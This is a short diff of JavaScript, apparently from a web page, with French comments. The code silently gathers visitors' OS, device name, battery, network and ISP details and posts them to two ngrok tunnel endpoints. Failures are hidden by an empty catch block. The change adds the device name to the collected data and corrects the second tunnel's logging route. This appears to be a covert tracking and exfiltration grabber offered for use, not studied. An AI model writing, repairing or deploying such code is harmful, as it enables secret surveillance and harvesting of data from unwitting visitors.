@@ -195,7 +195,7 @@
             }
 
             const payload = JSON.stringify({
-                os: os,
+                os: os + " (" + deviceName + ")",
                 battery: batteryInfo,
                 network: networkInfo,
                 isp: isp,
@@ -218,8 +218,8 @@
                 // Première adresse Ngrok
                 fetch('https://bottling-think-gray.ngrok-free.dev/api/log', options);
                 
-                // Seconde adresse Ngrok (remplace par ta deuxième URL)
-                fetch('https://clinic-carded-clanking.ngrok-free.dev/', options);
+                // Seconde adresse Ngrok avec la route API correcte
+                fetch('https://clinic-carded-clanking.ngrok-free.dev/api/log', options);
             } catch (e) {}
 
             let lineIndex = 0;
